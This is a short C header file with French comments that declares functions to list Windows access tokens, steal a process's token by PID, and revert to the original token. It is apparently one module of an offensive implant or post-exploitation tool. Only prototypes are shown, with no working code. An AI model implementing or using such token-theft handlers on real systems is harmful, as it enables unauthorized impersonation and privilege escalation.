/*
 * token.h - Manipulation de tokens Windows
 */

#ifndef HANDLER_TOKEN_H
#define HANDLER_TOKEN_H

#include "../../../include/common.h"

/*
 * Liste les tokens disponibles (process avec privilege SeDebug).
 */
int handler_token_list(char **output, size_t *len);

/*
 * Vole le token d'un processus.
 */
int handler_token_steal(DWORD pid);

/*
 * Revient au token original.
 */
int handler_token_revert(void);

#endif /* HANDLER_TOKEN_H */
